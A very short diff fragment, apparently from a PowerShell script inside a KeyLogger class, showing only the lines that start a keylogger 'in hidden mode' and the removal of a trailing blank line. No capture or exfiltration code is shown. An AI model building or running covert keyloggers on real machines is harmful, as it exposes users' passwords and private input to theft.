@@ -87,4 +87,3 @@ public class KeyLogger {
 # Start the keylogger in hidden mode
 Write-Host "Starting keylogger..."  # Debug message
 Start-KeyLogger
-
